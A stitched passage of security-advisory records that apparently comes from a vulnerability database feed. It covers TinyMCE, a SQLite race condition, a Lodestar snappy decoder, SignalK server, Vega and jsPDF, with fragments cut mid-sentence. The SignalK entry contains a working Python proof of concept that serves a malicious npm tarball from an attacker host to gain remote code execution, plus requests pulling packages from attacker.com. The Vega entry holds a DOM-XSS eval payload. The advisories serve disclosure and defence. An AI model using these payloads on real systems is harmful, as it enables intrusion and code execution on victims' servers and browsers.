Patches\nThis vulnerability has been patched in TinyMCE 5.6.0 by improved URL sanitization logic.\n\n### Workarounds\nTo work around this vulnerability, either:\n- Upgrade to TinyMCE 5.6.0 or higher\n- Manually sanitize `iframe`, `object` and `embed` URL attributes using a [TinyMCE node filter](https://www.tiny.cloud/docs/api/tinymce.html/tinymce.html.domparser/#addnodefilter).\n- Disable `iframe`, `object`, and `embed` elements in your content using the [invalid_elements](https://www.tiny.cloud/docs/configure/content-filtering/#invalid_elements) setting.\n\n#### Example: Sanitizing using a node filter\n```js\neditor.parser.addNodeFilter('iframe,object,embed', function(nodes) {\n  nodes.forEach(function(node) {\n    if (node.attributes) {\n      node.attributes.forEach(function(attr) {\n        var name = attr.name;\n        var value = attr.value;\n        // Sanitize the attribute value here or remove it entirely\n        var sanitizedValue = ...;\n        node.attr(name, santizedValue);\n      });\n    }\n  });\n});\n```\n\n#### Example: Using invalid_elements\n```js\ninvalid_elements: 'iframe,object,embed'\n```\n\n### Acknowledgements\nTiny Technologies would like to thank Aaron Bishop at SecurityMetrics for discovering this vulnerability.\n\n### References\nhttps://www.tiny.cloud/docs/release-notes/release-notes56/#securityfixes\n\n### For more information\nIf

You should be able to completely fix the race conditions by leveraging SQLITE write lock and just send one query.\n\n### Summary\nThe /get-patch endpoint processes a purchase in two separate database queries: a SELECT that verifies the token is unused, followed by an UPDATE that marks the token as used. Because SQLite only guards each statement, a malicious actor can issue two requests at the exact same moment and have both SELECT statements succeed before either UPDATE runs.\n\n### Details\n\nThe handler executes (step 1):\n\n```\nSELECT id, token_used_at FROM purchases WHERE patch_id = ? AND purchase_token = ? AND status = 'COMPLETED'\n```\n\nIf token_used_at IS NULL, the request passes the check (step 2): \n```\n        if (row.token_used_at) {\n            return res.status(403).json({ error: \"Purchase token has already been used.\" });\n        }\n```\n\n\nThe handler finally runs (step 3):\n\n```\nUPDATE purchases SET token_used_at = CURRENT_TIMESTAMP WHERE id = ?\n```\n\n\nWhen two requests arrive at the same time, they both finish step 1 while the row is still unused. SQLite serializes writers only per statement, so each request believes it has exclusive access.

This encoding type MUST be supported by all clients.\n```\n\nIn snappy framing format there a few types of chunks.\nWe are interested in so called reserved skippable chunks. These are chunks with chunk type in range [0x80, 0xfd]\nLet's see how rust snappy handles them https://github.com/BurntSushi/rust-snappy/blob/master/src/read.rs#L137\n\n```\nimpl<R: io::Read> io::Read for FrameDecoder<R> {\n    fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {\n \t\t   ... \n           ...\n  \t\t    let len = len64 as usize;\n            match ty {\n                Err(b) if 0x02 <= b && b <= 0x7F => {\n                    // Spec says that chunk types 0x02-0x7F are reserved and\n                    // conformant decoders must return an error.\n                    fail!(Error::UnsupportedChunkType { byte: b });\n                }\n                Err(b) if 0x80 <= b && b <= 0xFD => {\n                    // Spec says that chunk types 0x80-0xFD are reserved but\n                    // skippable.\n                    self.r.read_exact(&mut self.src[0..len])?;\n                }\n```\n\nSimilar code can be found in golang implementation - https://github.com/golang/snappy/blob/master/decode.go#L221\n\n```\nfunc (r *Reader) fill() error {\n\t...\n\tif chunkType <= 0x7f {\n\t\t\t// Section 4.5.

https://github.com/ChainSafe/lodestar/blob/unstable/packages/reqresp/src/encodingStrategies/sszSnappy/snappyFrames/uncompress.ts#L17\n\n```\nuncompress(chunk: Uint8ArrayList): Uint8ArrayList | null

this.buffer.subarray(4, 4 + frameSize);\n      this.buffer.consume(4 + frameSize);\n\n      if (!this.state.foundIdentifier && type !== ChunkType.IDENTIFIER) {\n        throw \"malformed input: must

Error(\"Unsupported snappy chunk type\");\n  }\n```\n\nAs you can see, lodestar does not recognize such chunks.\n\nIf it sees such chunk, function getChunkType() throws an exception and decoding fails.\n\n### Impact Details\n\nFaulty nodes may trigger chain stall by sending messages which lodestar fails to parse, while other clients will be able to handle.\n\n### Proof of Concept\n\nHow to reproduce:\n\n1. get archive (via provided [gist link](https://gist.github.com/gln7/bdde7f4e0bdf9d47bf810a015796867a)), decode and unpack it:\n```\n$ base64 -d poc.txt > poc.tgz\n$ tar zxf poc.tgz\n```\n\n2. run dec1.go to verify that our snappy file decompressed successfully\n```\n$ go run dec1.go\n\nreading 1.snappy...\nread 124 bytes, err <nil>\n```\n\n3. run dec1.mjs to verify that lodestar fails to decode such file\n```\nchecking chunk type=255\nchecking chunk type=1\ngot uncompressed chunk..\nchecking chunk type=129\nfile:///../poc/dec1.mjs:74\n            throw new

While the endpoint validates that the package name exists in the npm registry as a known plugin or webapp, the version parameter accepts arbitrary npm version specifiers including URLs. npm supports installing packages from git repositories, GitHub shorthand syntax, and HTTP/HTTPS URLs pointing to tarballs. When npm installs a package, it can automatically execute any `postinstall` script defined in `package.json`, enabling arbitrary code execution.\n\nThe vulnerability exists because npm's version specifier syntax is extremely flexible, and the SignalK code passes the version parameter directly to npm without sanitization. An attacker with admin access can install a package from an attacker-controlled source containing a malicious `postinstall` script.\n\n### Affected Code\n\n**File**: `src/interfaces/appstore.js` (lines 46-76)\n\n```javascript\napp.post(\n  [\n    `${SERVERROUTESPREFIX}/appstore/install/:name/:version`,\n    `${SERVERROUTESPREFIX}/appstore/install/:org/:name/:version`\n  ],\n  (req, res) => {\n    let name = req.params.name\n    const version = req.params.version  // No validation on version format\n    \n    // ... validation only checks if package name exists ...\n    \n    installSKModule(name, version)  // Passes unsanitized version to npm\n  }\n)\n```\n\n**File**: `src/modules.ts` (lines 180-205)\n\n```typescript\nif (name) {\n  packageString = version ? `${name}@${version}` : name  // Direct concatenation\n}\n\nif (process.platform === 'win32') {\n  npm = spawn('cmd', ['/c', `npm --save ${command} ${packageString}`], opts)\n} else {\n  npm = spawn('npm', ['--save', command, packageString], opts)\n}\n```\n\n### Impact\n\nAn attacker with admin credentials (obtained via the authentication bypass chain) can execute arbitrary commands on the server with the privileges of the SignalK process. This enables complete system compromise including data theft, backdoor installation, lateral movement, and denial of service.\n\nA compromised server can inject malicious PGN messages onto the NMEA 2000 bus or forge NMEA 0183 sentences, affecting all connected devices. Attack scenarios include manipulating autopilot systems (Pypilot, Raymarine, Garmin) via the Autopilot API to alter vessel course, spoofing AIS messages to create phantom vessels on radar, altering GPS position data sent to chart plotters and autopilots, injecting false depth sounder readings, manipulating wind instrument data, or sending shutdown commands to electronically controlled engines via NMEA 2000. Many vessels expose SignalK to the internet for remote monitoring, making them globally accessible to attackers.\n\nThe vulnerability can be exploited using any of npm's flexible version specifier formats:\n\n**1. Real npm Package with Required Keyword**\n\n```http\nPOST /skServer/appstore/install/malicious-signalk-plugin/1.0.0 HTTP/1.1\nHost: localhost:3000\nAuthorization: Bearer <VALID_AUTH_TOKEN>\nContent-Length: 0\n```\n\nPublishing a malicious package to the official npm registry with the `signalk-node-server-plugin` or `signalk-webapp` keyword allows us to install arbitrary npm packages using standard semantic versioning format (`1.0.0`). This is non-stealthy as the package is publicly visible, but can be leveraged to spread malware via npm's ecosystem, since such a package will show up on the webapp feed and other users might install it.\n\n**2. Real npm Package via npm Alias**\n\n```http\nPOST /skServer/appstore/install/signalk-pushover-plugin/npm:malicious-package@1.0.0 HTTP/1.1\nHost: localhost:3000\nAuthorization: Bearer <VALID_AUTH_TOKEN>\nContent-Length: 0\n```\n\nThe `npm:` prefix allows installing a package under a different name. For example, `npm:malicious-package@1.0.0` installs `malicious-package` but references it as if it were the legitimate `signalk-pushover-plugin`. This obscures the actual package being installed from casual inspection, making it stealthier while still requiring npm publishing.\n\n**3. Package Hosted on GitHub (GitHub Shorthand)**\n\n```http\nPOST /skServer/appstore/install/signalk-pushover-plugin/attacker%2Fmalicious-plugin HTTP/1.1\nHost: localhost:3000\nAuthorization: Bearer <VALID_AUTH_TOKEN>\nContent-Length: 0\n```\n\nThe format `username/repo` (URL-encoded as `attacker%2Fmalicious-plugin`) is shorthand for `github:username/repo`. npm automatically fetches the repository from GitHub, extracts it, and runs `npm install`. If the repo contains a `postinstall` script, it executes. The repository must contain a valid `package.json` with the malicious script.\n\n**4. Package Hosted on Attacker-Controlled Git Server (git+ Protocol)**\n\n```http\nPOST /skServer/appstore/install/signalk-pushover-plugin/git%2Bhttps:%2F%2Fattacker.com%2Fmalicious-plugin.git HTTP/1.1\nHost: localhost:3000\nAuthorization: Bearer <VALID_AUTH_TOKEN>\nContent-Length: 0\n```\n\nThe `git+https://` or `git+ssh://` prefix tells npm to clone a git repository. This works with any git server, not just GitHub. The attacker has full control over the repository contents and can update it at any time. This provides maximum control over the package source without relying on third-party services.\n\n**5. Package Hosted on Attacker Webserver as Tarball**\n\n```http\nPOST /skServer/appstore/install/signalk-pushover-plugin/http:%2F%2Fattacker.com%2Fpkg.tgz HTTP/1.1\nHost: localhost:3000\nAuthorization: Bearer <VALID_AUTH_TOKEN>\nContent-Length: 0\n```\n\nThe `http://` or `https://` URL pointing to a `.tgz` file tells npm to download and extract the tarball. This is the most flexible method as it requires no external service dependencies - the attacker controls both the package contents and the hosting infrastructure. No git repository or npm registry account needed.\n\nAll methods result in npm executing the `postinstall` script from the attacker-controlled package. A malicious npm package requires only two files to achieve RCE:\n\n**package.json** - Defines the package metadata and the malicious script:\n```json\n{\n  \"name\": \"signalk-evil-plugin\",\n  \"version\": \"1.0.0\",\n  \"keywords\": [\"signalk-node-server-plugin\"],\n  \"scripts\": {\n    \"postinstall\": \"node -e \\\"require('child_process').exec('calc.exe')\\\"\"\n  }\n}\n```\n\nThe `postinstall` script executes automatically after npm installs the package.\n\n**index.js** - Minimal plugin implementation to avoid errors:\n```javascript\nmodule.exports = function(app) {\n  return {\n    id: 'evil-plugin',\n    name: 'Evil Plugin',\n    start: function() {},\n    stop: function() {}\n  }\n}\n```\n\n### PoC using the tarball variant of the exploit\n\n```python\nimport requests\nimport tarfile\nimport json\nimport io\nimport threading\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\nfrom urllib.parse import quote\n\nTARGET = \"http://localhost:3000\"\nATTACKER_IP = \"localhost\"\nATTACKER_PORT = 9999\nRCE_COMMAND = \"calc.exe\"  # Windows; use \"id > /tmp/pwned\" for Linux\nTOKEN = \"<VALID_AUTH_TOKEN>\"\n\ndef create_malicious_tarball():\n    package_json = {\n        \"name\": \"signalk-evil-plugin\",\n        \"version\": \"1.0.0\",\n        \"keywords\": [\"signalk-node-server-plugin\"],\n        \"scripts\": {\n            \"postinstall\": f\"node -e \\\"require('child_process').exec('{RCE_COMMAND}')\\\"\"\n        }\n    }\n    \n    index_js = b\"module.exports = function(app) { return { id: 'evil', start: function(){}, stop: function(){} } }\"\n    \n    tar_buffer = io.BytesIO()\n    with tarfile.open(fileobj=tar_buffer, mode='w:gz') as tar:\n        # Add package.json\n        pkg_data = json.dumps(package_json, indent=2).encode()\n        pkg_info = tarfile.TarInfo(name=\"package/package.json\")\n        pkg_info.size = len(pkg_data)\n        tar.addfile(pkg_info, io.BytesIO(pkg_data))\n        \n        # Add index.js\n        idx_info = tarfile.TarInfo(name=\"package/index.js\")\n        idx_info.size = len(index_js)\n        tar.addfile(idx_info, io.BytesIO(index_js))\n    \n    return tar_buffer.getvalue()\n\ndef start_malicious_server(tarball_data):\n    class Handler(BaseHTTPRequestHandler):\n        def do_GET(self):\n            print(f\"[+] Victim fetched malicious package!\")\n            self.send_response(200)\n            self.send_header(\"Content-Type\", \"application/gzip\")\n            self.send_header(\"Content-Length\", len(tarball_data))\n            self.end_headers()\n            self.wfile.write(tarball_data)\n        \n        def log_message(self, *args):\n            pass\n    \n    server = HTTPServer((\"0.0.0.0\", ATTACKER_PORT), Handler)\n    thread = threading.Thread(target=server.serve_forever, daemon=True)\n    thread.start()\n    print(f\"[+] Malicious server running on port {ATTACKER_PORT}\")\n    return server\n\ndef trigger_rce(token):\n    tarball_url = f\"http://{ATTACKER_IP}:{ATTACKER_PORT}/package.tgz\"\n    encoded_url = quote(tarball_url, safe='')\n    \n    url = f\"{TARGET}/skServer/appstore/install/signalk-pushover-plugin/{encoded_url}\"\n    \n    headers = {\"Authorization\": f\"Bearer {token}\"}\n    \n    print(f\"[*] Triggering installation from {tarball_url}\")\n    r = requests.post(url, headers=headers)\n    print(f\"[+] Response: {r.status_code} - {r.text}\")\n\nif __name__ == \"__main__\":\n    tarball = create_malicious_tarball()\n    print(f\"[+] Created malicious tarball ({len(tarball)} bytes)\")\n    \n    start_malicious_server(tarball)\n    trigger_rce(TOKEN)\n```\n\n### Recommendation\n\n1. Restrict package installation to the official npm registry only by validating that version parameters match semver format\n2. Use npm's `--ignore-scripts` flag to prevent automatic script execution\n3. Implement an allowlist of approved packages\n4. Consider sandboxing the package installation process\n\nWhile we understand that allowing 3rd party plugin installation is an intended functionality we believe that more secure practices must be applied to the whole process given the operational importance a SignalK instance can have onboard a vessel and it's rise in polularity.","affected":[{"package":{"name":"signalk-server","ecosystem":"npm","purl":"pkg:npm/signalk-server"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"2.9.0"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-93jc-vqqc-vvvh/GHSA-93jc-vqqc-vvvh.json"}}],"references":[{"type":"WEB","url":"https://github.com/SignalK/signalk-server/security/advisories/GHSA-93jc-vqqc-vvvh"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2025-68619"},{"type":"WEB","url":"https://github.com/SignalK/signalk-server/commit/f06140bed702de93a5dbb6b33dc2486960764d1d"},{"type":"PACKAGE","url":"https://github.com/SignalK/signalk-server"},{"type":"WEB","url":"https://github.com/SignalK/signalk-server/releases/tag/v2.19.0"}],"database_specific":{"cwe_ids":["CWE-94"],"github_reviewed":true,"github_reviewed_at":"2026-01-02T15:23:39Z","nvd_published_at":"2026-01-01T19:15:53Z","severity":"HIGH"},"severity":[{"type":"CVSS_V3","score":"CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"},{"type":"CVSS_V4","score":"CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P"}],"_metadata":{"fetched_at":"2026-01-07T18:23:32.650950Z","source":"npm","ecosystem":"npm"}},{"schema_version":"1.7.3","id":"GHSA-v364-rw7m-3263","published":"2026-01-06T17:48:24Z","modified":"2026-01-06T18:11:17.805334Z","aliases":["CVE-2026-21877"],"summary":"n8n Vulnerable to RCE via Arbitrary File Write","details":"### Impact\nn8n is affected by an authenticated Remote Code Execution (RCE) vulnerability.\n\nUnder certain conditions, an authenticated user may be able to cause untrusted code to be executed by the n8n service.

This is a development-only debugging practice that should not be used in any situation where Vega/Vega-lite definitions can come from untrusted parties.\n\n### POC Summary\n\nVega offers the evaluation of expressions in a secure context. Arbitrary function call is prohibited. When an event is exposed to an expression, member get of window objects is possible. Because of this exposure, in some applications, a crafted object that sets a `map` value with a function copied from the window that results in calling `this.foo(this.bar)` can be passed to the vlSelectionTuples function, calling the copied `map` function, allowing DOM XSS to be achieved. \n\nIn practice, an accessible gadget like this exists in the global VEGA_DEBUG code. \n\n```js\nvlSelectionTuples({\n    map: event.view.VEGA_DEBUG.vega.CanvasHandler.prototype.on,\n    eventName: event.view.console.log,\n    _handlers:{\n        undefined: 'alert(origin + ` XSS on version `+ VEGA_DEBUG.VEGA_VERSION)'\n    },\n    _handlerIndex: event.view.eval\n})\n```\n\n### POC Details\n```json\n{\n  \"$schema\": \"https://vega.github.io/schema/vega/v5.json\",\n  \"width\": 350,\n  \"height\": 350,\n  \"autosize\": \"none\",\n  \"description\": \"Toggle Button\",\n  \"signals\": [\n    {\n      \"name\": \"toggle\",\n      \"value\": true,\n      \"on\": [\n        {\n          \"events\": {\"type\": \"click\", \"markname\": \"circle\"},\n          \"update\": \"toggle ? false : true\"\n        }\n      ]\n    },\n    {\n      \"name\": \"addFilter\",\n      \"on\": [\n        {\n          \"events\": {\"type\": \"mousemove\", \"source\": \"window\"},\n          \"update\": \"vlSelectionTuples({map:event.view.VEGA_DEBUG.vega.CanvasHandler.prototype.on, eventName:event.view.console.log,_handlers:{undefined:'alert(origin + ` XSS on version `+ VEGA_DEBUG.VEGA_VERSION)'},_handlerIndex:event.view.eval})\"\n        }\n      ]\n    }\n  ]\n}\n```\n\nThis payload creates a scenario where whenever the mouse is moved, the map function of the provided object is called by the code that implements the vlSelectionTuples  function. The map function has been set to a \"gadget function\" (VEGA_DEBUG.vega.CanvasHandler.prototype.on) that does the following:\n\n```js\n   on(a, o) {\n        const u = this.eventName(a)\n          , d = this._handlers;\n        if (this._handlerIndex(d[u], a, o) < 0) {\n        ....\n        }\n        ....\n   }\n```\n\n1. Set `u` to the result of calling `this.eventName` with undefined \n    - For our object, we have the eventName value set to console.log, which just logs undefined and returns undefined\n4. Sets `d` to `this._handlers`\n    - For our object, we have this defined to be used later\n5. Calls `this._handlerIndex` with the result of `u` indexed into the `d` object as the first argument, and undefined as the second two.\n    - For our object, `_handlerIndex` is set to window.eval, and when indexing undefined into the `_handlers`, a string to be evald containing the XSS payload is returned.\n    \nThis results in XSS by using a globally scoped gadget to get full blown eval. \n\n\n### PoC Link\n\nNavigate [here](https://vega.github.io/editor/#/url/vega/N4IgJAzgxgFgpgWwIYgFwhgF0wBwqgegIDc4BzJAOjIEtMYBXAI0poHsDp5kTykSArJQBWENgDsQAGhAB3GgBN6aAMwCADDPg0yWVRplIGmNhBoAvOGhDiJVmQrjQATjRyZ2k9ABU2ZMgA2cAAEAELGJpIyZmTiSAEQaADaoHEIVugm-kHSIMTxDBmYzoUyEsmgcKTimImooJgAnjgZIFABNFAA1rnIzl1prVA0zu1WAL4yDDgKSJitWYEhAPzBAGbxECGowcWFIOMAupOpSOnWSAoKAGI0AfPOueWoKSBVcDV1Dc2tCGwMWz+pFyYgYo1a8nECjYsgOUxmc1axACAGU4EEoB4JN5pkEIAAKYDIHCod41SjEGhwWSUABqAFEAOIAQQA+gARemhACqjIpfEoAGEkOJ8hAABIihRBZyUHDONgmJotSgSKTBMmYAByZzgpOqmApVJpUAkYiClACfikrJgUpl+GADChcDWNHEcAUqAA5PE4M5MPi2K5aOJggBqYIAA2CAA0USjghJgqRnGZk1HIwyWRyuby6Uy2QyAEoogCSAHktQBKb2TW32-1ll0AD31H0NlOplCq8XG1YOx2OQA), move the mouse, and observe that the arbitrary JavaScript from the configuration reaches the eval sink and DOM XSS is achieved.\n\nFor a PoC that works even with the AST evaluator, abusing function call gadgets to get access to window.eval with more advanced gadgets, navigate [here](https://vega.github.io/editor/#/url/vega/N4IgJAzgxgFgpgWwIYgFwhgF0wBwqgegIDc4BzJAOjIEtMYBXAI0poHsDp5kTykSArJQBWENgDsQAGhAB3GgBN6aAMwCADDPg0yWVRplIGmNhBoAvOGhDiJVmQrjQATjRyZ2k9ABU2ZMgA2cAAEAELGJpIyZmTiSAEQaADaoHEIVugm-kHSIMTxDBmYzoUyEsmgcKTimImooJgAnjgZIFABNFAA1rnIzl1prVA0zu1WAL4yDDgKSJitWYEhAPzBAGbxECGowcWFIOMAupOpSOnWSAoKAGI0AfPOueWoKSBVcDV1Dc2tCGwMWz+pFyYgYo1a8nECjYsgOUxmc1axACAGU4EEoB4JN5pkEIAAKYDIHCod41SjEGhwWSUABqAFEAOIAQQA+gARemhACqjIpfDpVJpOGcbBMTRalFZziccEwACUPo4Zc4pNKlXAVag9nA1ejUAByKrxA16gKhGhQw3xTWYfFsVy0cTBADUwQABsEABoolHBCTBUjOMwB91uhksjlc3l0plshnylEASQA8gA5ACUpstdBo8QscFJ1UwFKFscjnJ5fNIFEoiqhms1lBFYrFPylATYlzVncumqLHxLlOp4wzB2OxyAA)\n\n### Future investigation\n\nIn cases where `VEGA_DEBUG` is not enabled, there could theoretically be other gadgets on the global scope that allow for similar behavior. In cases where AST evaluator is used and there are blocks against getting references to `eval`, in theory there could be other gadgets on global scope (i.e. jQuery) that would allow for eval the same way (i.e. `$.globalEval`). As of this writing, no such globally scoped universal gadgets have been found. \n\n### Recommended Fix\nIn the `selectionTuples` [implementation](https://github.com/vega/vega/blob/21677ce895460ca56b7173d64f1883f29cf4bcc4/packages/vega-selections/src/selectionTuples.js#L12) that backs the vulnerable function call, the code should be changed to check `Array.isArray(array)` before calling a potentially dangerous user provided `.map` on the `array` argument.\n\n### Impact\n\nThis vulnerability allows for DOM XSS, potentially stored, potentially reflected, depending on how the library is being used. The vulnerability requires user interaction with the page to trigger.  \n\nAn attacker can exploit this issue by tricking a user into opening a malicious Vega specification. Successful exploitation allows the attacker to execute arbitrary JavaScript in the context of the application’s domain. This can lead to theft of sensitive information such as authentication tokens, manipulation of data displayed to the user, or execution of unauthorized actions on behalf of the victim. This exploit compromises confidentiality and integrity of impacted applications.","affected":[{"package":{"name":"vega-selections","ecosystem":"npm","purl":"pkg:npm/vega-selections"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"5.6.3"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-829q-m3qg-ph8r/GHSA-829q-m3qg-ph8r.json"}},{"package":{"name":"vega-selections","ecosystem":"npm","purl":"pkg:npm/vega-selections"},"ranges":[{"type":"SEMVER","events":[{"introduced":"6.0.0"},{"fixed":"6.1.2"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-829q-m3qg-ph8r/GHSA-829q-m3qg-ph8r.json"}}],"references":[{"type":"WEB","url":"https://github.com/vega/vega/security/advisories/GHSA-829q-m3qg-ph8r"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2025-65110"},{"type":"PACKAGE","url":"https://github.com/vega/vega"}],"database_specific":{"cwe_ids":["CWE-79"],"github_reviewed":true,"github_reviewed_at":"2026-01-05T22:56:59Z","nvd_published_at":"2026-01-05T22:15:51Z","severity":"HIGH"},"severity":[{"type":"CVSS_V3","score":"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"}],"_metadata":{"fetched_at":"2026-01-07T18:23:32.637904Z","source":"npm","ecosystem":"npm"}},{"schema_version":"1.7.3","id":"GHSA-f8cm-6447-x5h2","published":"2026-01-05T17:35:29Z","modified":"2026-01-06T16:28:46.284506Z","aliases":["CVE-2025-68428"],"summary":"jsPDF has Local File Inclusion/Path Traversal vulnerability","details":"### Impact\nUser control of the first argument of the loadFile method in the node.js build allows local file inclusion/path traversal.\n\nIf given the possibility to pass unsanitized paths to the loadFile method, a user can retrieve file contents of arbitrary files in the local file system the node process is running in.

See the [node documentation](https://nodejs.org/api/permissions.html) for details.\n\nFor older node versions, sanitize user-provided paths before passing them to jsPDF.\n\n### Credits\nResearcher: kilkat (Kwangwoon Kim)","affected":[{"package":{"name":"jspdf","ecosystem":"npm","purl":"pkg:npm/jspdf"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"4.0.0"}]}],"database_specific":{"last_known_affected_version_range":"<= 3.0.4","source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-f8cm-6447-x5h2/GHSA-f8cm-6447-x5h2.json"}}],"references":[{"type":"WEB","url":"https://github.com/parallax/jsPDF/security/advisories/GHSA-f8cm-6447-x5h2"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2025-68428"},{"type":"WEB","url":"https://github.com/parallax/jsPDF/commit/a688c8f479929b24a6543b1fa2d6364abb03066d"},{"type":"PACKAGE","url":"https://github.com/parallax/jsPDF"},{"type":"WEB","url":"https://github.com/parallax/jsPDF/releases/tag/v4.0.0"}],"database_specific":{"cwe_ids":["CWE-35","CWE-73"],"github_reviewed":true,"github_reviewed_at":"2026-01-05T17:35:29Z","nvd_published_at":"2026-01-05T22:15:51Z","severity":"CRITICAL"},"severity":[{"type":"CVSS_V4","score":"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N"}],"_metadata":{"fetched_at":"2026-01-07T18:23:32.676900Z","source":"npm","ecosystem":"npm"}},{"schema_version":"1.7.3","id":"MAL-2026-93","published":"2026-01-06T13:29:42Z","modified":"2026-01-06T14:56:15.987316Z","aliases":["GHSA-r3jx-4g39-9qjm"],"summary":"Malicious code in okta-signin-widget (npm)","details":"\n---\n_-= Per source details.
